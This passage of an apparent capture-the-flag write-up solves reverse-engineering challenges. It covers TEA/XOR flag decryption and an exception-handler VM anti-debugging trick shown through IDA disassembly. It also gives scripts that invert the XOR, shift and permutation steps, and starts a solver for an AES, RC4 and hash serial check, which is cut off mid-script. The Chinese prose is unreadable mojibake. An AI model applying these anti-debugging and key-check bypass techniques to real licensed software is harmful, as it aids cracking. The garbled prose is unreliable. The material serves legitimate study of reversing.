class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">XOR</span><span class="params">(<span class="keyword">uint32_t</span> *arr)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> sum = <span class="number">0x73FF8CA6</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">        arr[i] ^= sum;</span><br><span class="line">        sum -= <span class="number">0x50FFE544</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> key[<span class="number">4</span>] = &#123; <span class="number">0x82aba3fe</span>, <span class="number">0xac1ddca8</span>, <span class="number">0x87ec6b60</span>, <span class="number">0xa2394568</span> &#125;;</span><br><span class="line">    <span class="keyword">uint32_t</span> c1[<span class="number">2</span>] = &#123; <span class="number">3991505723</span>, <span class="number">3531991019</span> &#125;;</span><br><span class="line">    <span class="keyword">uint32_t</span> c2[<span class="number">2</span>] = &#123; <span class="number">1360416890</span>, <span class="number">2984008969</span> &#125;;</span><br><span class="line">    <span class="keyword">uint32_t</span> c3[<span class="number">2</span>] = &#123; <span class="number">1169078549</span>, <span class="number">1301151568</span> &#125;;</span><br><span class="line">    <span class="keyword">uint32_t</span> c4[<span class="number">2</span>] = &#123; <span class="number">3739270283</span>, <span class="number">2612854497</span> &#125;;</span><br><span class="line">    <span class="keyword">uint32_t</span> v = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    TEA_decrypt(c1, key);</span><br><span class="line">    TEA_decrypt(c2, key);</span><br><span class="line">    TEA_decrypt(c3, key);</span><br><span class="line">    TEA_decrypt(c4, key);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">uint32_t</span> arr[] = &#123; <span class="number">0x3e9affcb</span>, <span class="number">0x478dce18</span>, <span class="number">0xb891a541</span>, <span class="number">0xc191b885</span>, <span class="number">0x6b9a84ff</span>, <span class="number">0xad61703e</span>, <span class="number">0xeb5f6c7d</span>, <span class="number">0x62772dbb</span> &#125;;</span><br><span class="line">    XOR(arr);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%x&quot;</span>, arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//æ‰“å°çš„æ˜¯flagçš„16è¿›åˆ¶è¡¨ç¤ºå½¢å¼ï¼Œå†ç”¨pythonè½¬æˆå­—ç¬¦ä¸²</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210202224635428.png"></p><p><em>flag: Mesmerizing_And_Desirable_As_wjq</em></p><h3 id="Enigma"><a href="#Enigma" class="headerlink" title="Enigma"></a>Enigma</h3><p>è¿™é¢˜æœ‰æ„æ€</p><p>å¼‚å¸¸å¤„ç†åè°ƒè¯•ï¼Œå‡½æ•°sub_AE10C0è°ƒç”¨äº†SetUnhandledExceptionFilterå‡½æ•°ï¼Œæ„æ€å°±æ˜¯å‘ç”Ÿå¼‚å¸¸æ—¶è°ƒç”¨æ³¨å†Œçš„å‡½æ•°ï¼Œçœ‹çœ‹æ³¨å†Œçš„å‡½æ•°</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210204132938000.png"></p><p>æ³¨å†Œçš„å‡½æ•°æ˜¯ä¸€ä¸ªè™šæ‹Ÿæœºï¼Œä½†æ˜¯è¿™ä¸ªè™šæ‹Ÿæœºå¾ˆç‰¹æ®Šï¼Œé‡Œé¢çš„handlæ˜¯åŠ å‡è¿ç®—å’Œä½è¿ç®—ï¼Œå‚æ•°æ˜¯å„ç§å¯„å­˜å™¨</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210204133850534.png"></p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210204133647983.png"></p><p>å›åˆ°å‡½æ•°sub_AE10C0å‘ç°äº†C7è¿™ä¸ªå­—èŠ‚ç è§¦å‘éæ³•æŒ‡ä»¤å¼‚å¸¸ï¼Œç„¶åè°ƒç”¨æ³¨å†Œçš„å‡½æ•°ç›¸å½“äºç”¨é‚£ä¸ªè™šæ‹Ÿæœºæ¨¡æ‹Ÿäº†ä¸€äº›æ±‡ç¼–æŒ‡ä»¤ï¼Œç›´æ¥è¿˜åŸåé™æ€çœ‹æ±‡ç¼–å°±OK</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line">           push    ebp</span><br><span class="line">.text:004018F1                 mov     ebp, esp</span><br><span class="line">.text:004018F3                 push    ebx</span><br><span class="line">.text:004018F4                 push    esi</span><br><span class="line">.text:004018F5                 push    edi</span><br><span class="line">.text:004018F6                 push    offset sub_401630</span><br><span class="line">.text:004018FB                 call    ds:SetUnhandledExceptionFilter</span><br><span class="line">.text:004018FB ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401901                 db 0C7h                 ; and eax, 0</span><br><span class="line">.text:00401902                 db 0FFh</span><br><span class="line">.text:00401903                 db    4                 </span><br><span class="line">.text:00401904                 db    1</span><br><span class="line">.text:00401905                 db    0</span><br><span class="line">.text:00401906 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401906                 xor     ecx, ecx</span><br><span class="line">.text:00401908</span><br><span class="line">.text:00401908 loc_401908:                             ; CODE XREF: .text:00401922â†“j</span><br><span class="line">.text:00401908                 cmp     ecx, 20h ; &#39; &#39;</span><br><span class="line">.text:0040190B                 jge     short loc_401924</span><br><span class="line">.text:0040190B ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0040190D                 db 0C7h                 ; add eax, 11h</span><br><span class="line">.text:0040190E                 db 0FFh                    </span><br><span class="line">.text:0040190F                 db    0</span><br><span class="line">.text:00401910                 db    1</span><br><span class="line">.text:00401911                 db  11h</span><br><span class="line">.text:00401912                 db 0C7h                 ; and eax,1Fh</span><br><span class="line">.text:00401913                 db 0FFh</span><br><span class="line">.text:00401914                 db    4</span><br><span class="line">.text:00401915                 db    1</span><br><span class="line">.text:00401916                 db  1Fh</span><br><span class="line">.text:00401917 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401917                 mov     dword ptr (byte_457A4C+24h)[ecx*4], eax</span><br><span class="line">.text:00401917 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0040191E                 db 0C7h                  ; inc ecx</span><br><span class="line">.text:0040191F                 db 0FFh</span><br><span class="line">.text:00401920                 db    2</span><br><span class="line">.text:00401921                 db    3</span><br><span class="line">.text:00401922 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401922                 jmp     short loc_401908</span><br><span class="line">.text:00401924 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401924</span><br><span class="line">.text:00401924 loc_401924:                             ; CODE XREF: .text:0040190Bâ†‘j</span><br><span class="line">.text:00401924                 xor     ecx, ecx</span><br><span class="line">.text:00401926</span><br><span class="line">.text:00401926 loc_401926:                             ; CODE XREF: .text:00401956â†“j</span><br><span class="line">.text:00401926                 cmp     ecx, 20h ; &#39; &#39;</span><br><span class="line">.text:00401929                 jge     short loc_401958</span><br><span class="line">.text:0040192B                 mov     ebx, dword ptr (byte_457A4C+24h)[ecx*4]</span><br><span class="line">.text:00401932                 mov     edx, dword ptr (byte_457A4C+28h)[ecx*4]</span><br><span class="line">.text:00401939                 mov     al, byte_457A4C[edx]</span><br><span class="line">.text:0040193F                 mov     byte_4579E0[ebx], al</span><br><span class="line">.text:00401945                 mov     al, byte_457A4C[ebx]</span><br><span class="line">.text:0040194B                 mov     byte_4579E0[edx], al</span><br><span class="line">.text:0040194B ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401951                 db 0C7h</span><br><span class="line">.text:00401952                 db 0FFh                 ; add ecx, 2</span><br><span class="line">.text:00401953                 db    0</span><br><span class="line">.text:00401954                 db    3</span><br><span class="line">.text:00401955                 db    2</span><br><span class="line">.text:00401956 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401956                 jmp     short loc_401926</span><br><span class="line">.text:00401958 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401958</span><br><span class="line">.text:00401958 loc_401958:                             ; CODE XREF: .text:00401929â†‘j</span><br><span class="line">.text:00401958                 xor     ecx, ecx</span><br><span class="line">.text:0040195A</span><br><span class="line">.text:0040195A loc_40195A:                             ; CODE XREF: .text:00401992â†“j</span><br><span class="line">.text:0040195A                 cmp     ecx, 20h ; &#39; &#39;</span><br><span class="line">.text:0040195D                 jge     short loc_401994</span><br><span class="line">.text:0040195F                 mov     bl, byte_4579E0[ecx]</span><br><span class="line">.text:0040195F ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401965                 db 0C7h                 ; and ebx, 1Fh</span><br><span class="line">.text:00401966                 db 0FFh</span><br><span class="line">.text:00401967                 db    4</span><br><span class="line">.text:00401968                 db    2</span><br><span class="line">.text:00401969                 db  1Fh</span><br><span class="line">.text:0040196A                 db 0C7h                 ; shl bl, 3</span><br><span class="line">.text:0040196B                 db 0FFh</span><br><span class="line">.text:0040196C                 db    7</span><br><span class="line">.text:0040196D                 db    2</span><br><span class="line">.text:0040196E                 db    3</span><br><span class="line">.text:0040196F ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0040196F                 mov     esi, ecx</span><br><span class="line">.text:00401971                 inc     esi</span><br><span class="line">.text:00401972                 and     esi, 1Fh</span><br><span class="line">.text:00401975                 mov     dl, byte_4579E0[esi]</span><br><span class="line">.text:0040197B                 and     dl, 0E0h</span><br><span class="line">.text:0040197E                 and     edx, 0FFh</span><br><span class="line">.text:0040197E ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401984                 db 0C7h                  ; shr dl, 5 </span><br><span class="line">.text:00401985                 db 0FFh</span><br><span class="line">.text:00401986                 db    8</span><br><span class="line">.text:00401987                 db    4</span><br><span class="line">.text:00401988                 db    5</span><br><span class="line">.text:00401989 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401989                 or      bl, dl</span><br><span class="line">.text:0040198B                 mov     byte_457A04[ecx], bl</span><br><span class="line">.text:00401991                 inc     ecx</span><br><span class="line">.text:00401992                 jmp     short loc_40195A</span><br><span class="line">.text:00401994 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401994</span><br><span class="line">.text:00401994 loc_401994:                             ; CODE XREF: .text:0040195Dâ†‘j</span><br><span class="line">.text:00401994                 mov     al, byte_457A04</span><br><span class="line">.text:00401999                 mov     byte_457A28, al</span><br><span class="line">.text:0040199E                 mov     ecx, 1</span><br><span class="line">.text:004019A3</span><br><span class="line">.text:004019A3 loc_4019A3:                             ; CODE XREF: .text:004019CEâ†“j</span><br><span class="line">.text:004019A3                 cmp     ecx, 20h ; &#39; &#39;</span><br><span class="line">.text:004019A6                 jge     short loc_4019D0</span><br><span class="line">.text:004019A8                 mov     bl, byte_457A04[ecx]</span><br><span class="line">.text:004019AE                 mov     esi, ecx</span><br><span class="line">.text:004019AE ; ---------------------------------------------------------------------------</span><br><span class="line">.text:004019B0                 db 0C7h                 ; inc ecx</span><br><span class="line">.text:004019B1                 db 0FFh                 </span><br><span class="line">.text:004019B2                 db    3 </span><br><span class="line">.text:004019B3                 db    5</span><br><span class="line">.text:004019B4 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:004019B4                 xor     bl, byte_457A04[esi]</span><br><span class="line">.text:004019BA                 mov     esi, ecx</span><br><span class="line">.text:004019BA ; ---------------------------------------------------------------------------</span><br><span class="line">.text:004019BC                 db 0C7h                 ; and esi, 3</span><br><span class="line">.text:004019BD                 db 0FFh                              </span><br><span class="line">.text:004019BE                 db    4 </span><br><span class="line">.text:004019BF                 db    5</span><br><span class="line">.text:004019C0                 db    3</span><br><span class="line">.text:004019C1 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:004019C1                 xor     bl, byte ptr aBier[esi] ; &quot;Bier&quot;</span><br><span class="line">.text:004019C7                 mov     byte_457A28[ecx], bl</span><br><span class="line">.text:004019CD                 inc     ecx</span><br><span class="line">.text:004019CE                 jmp     short loc_4019A3</span><br></pre></td></tr></table></figure><p>åŠ å¯†è¿‡ç¨‹ä¸å¤æ‚ï¼Œé¦–å…ˆè®¡ç®—äº†ä¸€ç»„0åˆ°31çš„æ— åºæ•°ï¼Œç„¶åæŒ‰ç…§æ— åºæ•°ä¸¤ä¸ªä¸€ç»„äº¤æ¢è¾“å…¥æ•°æ®ï¼Œæ¥ç€è¿›è¡Œä½è¿ç®—ï¼Œæ€»ä½“å‘å‰ç§»åŠ¨äº†ä¸‰ä½ï¼Œæœ€åè¿›è¡Œäº†å¼‚æˆ–åŠ å¯†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è§£å¼‚æˆ–åŠ å¯†çš„è„šæœ¬</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span>():</span></span><br><span class="line">    res = []</span><br><span class="line">    key = <span class="string">&#x27;Bier&#x27;</span></span><br><span class="line">    Cipher = <span class="string">&#x27;938b8f431268f7907a4b6e421301b42120738d68cb19fcf8b26bc4abc89b8d22&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(Cipher),<span class="number">2</span>):</span><br><span class="line">        res.append(int(Cipher[i:i+<span class="number">2</span>], <span class="number">16</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(res)):</span><br><span class="line">        res[i] = res[i] ^ ord(key[(i)%<span class="number">4</span>]) ^ res[i<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="comment"># [147, 113, 155, 170, 250, 251, 105, 139, 179, 145, 154, 170, 251, 147, 66, 17, 115, 105, 129, 155, 18, 98, 251, 113, 129, 131, 34, 251, 113, 131, 107, 59]</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ä½è¿ç®—è„šæœ¬</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    BYTE byte[] = &#123; <span class="number">147</span>, <span class="number">113</span>, <span class="number">155</span>, <span class="number">170</span>, <span class="number">250</span>, <span class="number">251</span>, <span class="number">105</span>, <span class="number">139</span>, <span class="number">179</span>, <span class="number">145</span>, <span class="number">154</span>, <span class="number">170</span>, <span class="number">251</span>, <span class="number">147</span>, <span class="number">66</span>, <span class="number">17</span>, <span class="number">115</span>, <span class="number">105</span>, <span class="number">129</span>, <span class="number">155</span>, <span class="number">18</span>, <span class="number">98</span>, <span class="number">251</span>, <span class="number">113</span>, <span class="number">129</span>, <span class="number">131</span>, <span class="number">34</span>, <span class="number">251</span>, <span class="number">113</span>, <span class="number">131</span>, <span class="number">107</span>, <span class="number">59</span> &#125;;</span><br><span class="line">    BYTE index = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> first = byte[<span class="number">0</span>] &gt;&gt; <span class="number">3</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, (<span class="number">147</span> &gt;&gt;<span class="number">3</span>)&amp;<span class="number">0xFF</span> | (<span class="number">59</span> &lt;&lt;<span class="number">5</span>)&amp;<span class="number">0xFF</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">31</span>; i++) &#123;</span><br><span class="line">        BYTE x = (byte[i] &lt;&lt; <span class="number">5</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">        BYTE y = (byte[i + <span class="number">1</span>] &gt;&gt; <span class="number">3</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, x | y);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// rn3u__m1vr3U_rhB.m03bL_n00d_n0mg</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># äº¤æ¢ä½ç½®</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Change</span>():</span></span><br><span class="line">    flag = list(<span class="string">&#x27;rn3u__m1vr3U_rhB.m03bL_n00d_n0mg&#x27;</span>)</span><br><span class="line">    index = []</span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">        num += <span class="number">0x11</span></span><br><span class="line">        num &amp;= <span class="number">0x1F</span></span><br><span class="line">        index.append(num)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">32</span>,<span class="number">2</span>):</span><br><span class="line">        flag[index[i]], flag[index[i+<span class="number">1</span>]] = flag[index[i+<span class="number">1</span>]], flag[index[i]]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(flag)):</span><br><span class="line">        print(flag[i],end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p><em>flag: B0mb3_L0nd0n_m0rg3n_um_v13r_Uhr.</em></p><h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><p>â€‹        è¿™é“é¢˜è¿‡ç¨‹ä¸å¤æ‚ï¼Œè°ƒç”¨äº†SetUnhandledExceptionFilterï¼Œæ³¨å†Œå¼‚å¸¸å¤„ç†å‡½æ•°ï¼Œé€šè¿‡C7è¿™ä¸ªéæ³•æŒ‡ä»¤è§¦å‘å¼‚å¸¸ï¼Œè¿è¡Œè¿™ä¸ªå¼‚å¸¸å¤„ç†å‡½æ•°ï¼Œä»è€Œè¿›è¡ŒåŠ å¯†æ“ä½œ</p><p>â€‹        å¦‚æœæƒ³åŠ¨æ€è°ƒè¯•çš„è¯å¯ä»¥ç›´æ¥æ”¹å­—èŠ‚ç ï¼ˆæˆ‘åªä¼šè¿™ä¸€ç§æ–¹æ³•ã€‚ã€‚ï¼‰ä¸çŸ¥é“è¿˜æœ‰æ²¡æœ‰å…¶ä»–æ–¹æ³•ï¼Œä½†æ˜¯åšé¢˜çš„æ—¶å€™éœ€è¦ç»†å¿ƒä¸€ç‚¹ï¼Œå› ä¸ºæ±‡ç¼–çš„ä¸€äº›è¿‡ç¨‹æ²¡æœ‰çœ‹æ¸…å¯¼è‡´æµªè´¹äº†æˆ‘å¾ˆå¤šæ—¶é—´</p><h3 id="obfu"><a href="#obfu" class="headerlink" title="obfu"></a>obfu</h3><p>æˆ‘æå¾—æœ€çƒ¦çš„ä¸€é“é¢˜ã€‚ã€‚ä»¥å‰æ²¡æœ‰æè¿‡å¸¦ivçš„AESï¼Œä¹Ÿä»æ¥æ²¡æœ‰çœ‹è¿‡sha256å’Œmd5çš„åç¼–è¯‘ä»£ç ï¼Œè¿™æ¬¡ç®—æ˜¯é‡åˆ°äº†ã€‚ã€‚çœ‹äº†å¾ˆä¹…éƒ½æ²¡æœ‰çœ‹å‡ºæ¥ï¼Œæœ€åçœ‹äº†åˆ«çš„å¸ˆå‚…çš„wpæ‰å‡ºæ¥çš„ã€‚å…¶å®è¿™é“é¢˜çŸ¥é“äº†md5å’Œsha256ä¹‹ååŠ å¯†è¿‡ç¨‹å¹¶ä¸å¤æ‚ï¼Œä½†æ˜¯å¦‚æœæ˜¯ç¬¬ä¸€æ¬¡é‡åˆ°é‚£å°±æ¼ç«äº†ï¼ˆæ¯”å¦‚åƒæˆ‘ï¼‰</p><p>æ€»å…±ç®—ä¸‹æ¥è¿™é“é¢˜ä¸€å…±æœ‰5ä¸ªæ­¥éª¤</p><ol><li><p>å­—ç¬¦ä¸²è½¬16è¿›åˆ¶</p><p>æ‰“ä¸ªæ¯”æ–¹ï¼šæ¯”å¦‚æˆ‘ä»¬è¾“å…¥123456ï¼Œé‚£ä¹ˆç¨‹åºä¼šå°†æˆ‘ä»¬è¾“å…¥çš„è½¬ä¸º 12 23 45è¿™ä¸‰ä¸ª16è¿›åˆ¶æ•°è¿›è¡Œä¿å­˜ï¼Œå› æ­¤å‰é¢åªå…è®¸è¾“å…¥0-9 a-fçš„å­—ç¬¦</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210205003234483.png" alt="image-20210205003234483"></p></li><li><p>ä½è¿ç®—</p><p>æ€»ä½“å‘å‰ç§»åŠ¨äº†ä¸‰ä½ï¼ˆæˆ‘æ€€ç–‘è¿™æ¬¡çš„é¢˜æ˜¯ä¸€ä¸ªäººå‡ºçš„ï¼ŒåŠ å¯†ç®—æ³•éƒ½å¥½ç›¸ä¼¼ã€‚ã€‚ï¼‰</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210205003456605.png"></p></li><li><p>è®¡ç®—keyå’Œiv</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210205003652039.png"></p></li><li><p>rc4å’ŒAES</p><p>æ³¨æ„AESæ˜¯è§£å¯†ï¼Œé¢˜ç›®ç”¨çš„æ˜¯Resç›’å­ï¼Œå¹¶ä¸æ˜¯å¸¸è§„çš„Sç›’å­ï¼Œæ‰€ä»¥æˆ‘ä»¬å†™è„šæœ¬çš„æ—¶å€™æ˜¯åŠ å¯†</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210205004416149.png"></p></li></ol><p>5.ä¸ç”¨md5ç”Ÿæˆçš„åºåˆ—æ¯”è¾ƒ</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210205004520967.png"></p><p>å¦‚æœåºåˆ—å·æ¯”å¯¹æˆåŠŸï¼Œç¨‹åºå°±ä¼šè¯»å–flag.encä¸­çš„äºŒè¿›åˆ¶æ•°æ®ï¼Œæˆ‘ä»¬è¾“å…¥ç„¶åé€šè¿‡åŠ å¯†è®¡ç®—å¾—åˆ°çš„åºåˆ—å·å°±ä¼šä½œä¸ºkeyè§£å¯†flag.encçš„äºŒè¿›åˆ¶æ•°æ®æµï¼ŒåŒæ ·ä¹Ÿæ˜¯AES CBCæ¨¡å¼ï¼Œä½†æ˜¯è¿™éƒ¨åˆ†ä¸ç”¨æˆ‘ä»¬å…³å¿ƒï¼Œæˆ‘ä»¬åªéœ€è¦å¾—åˆ°æ­£ç¡®çš„åºåˆ—å·å°±å¯ä»¥äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> Cryptodome.Cipher <span class="keyword">import</span> AES,ARC4</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">string = <span class="string">b&#x27;admin&#x27;</span></span><br><span class="line">new_res = [<span class="number">0x8c</span>]</span><br><span class="line"></span><br><span class="line">Plain_AES = binascii.unhexlify(hashlib.md5(string).hexdigest())</span><br><span class="line">digest = hashlib.sha256(string).hexdigest()</span><br><span class="line"></span><br><span class="line">res = [i <span class="keyword">for</span> i <span class="keyword">in</span> binascii.unhexlify(digest)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">32</span>):</span><br><span class="line">    new_res.append(res[i] ^ res[i - <span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># aesåŠ å¯†</span></span><br><span class="line">key = binascii.a2b_hex((bytes(new_res).hex()[:<span class="number">32</span>]).encode())</span><br><span class="line">iv = binascii.a2b_hex((bytes(new_res).hex()[<span class="number">32</span>:]).encode())</span><br><span class="line">aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">Cipher_AES = aes.encrypt(Plain_AES)</span><br><span class="line"></span><br><span class="line"><span class="comment"># rc4åŠ å¯†</span></span><br><span class="line">rc4_cipher = Cipher_AES</span><br><span 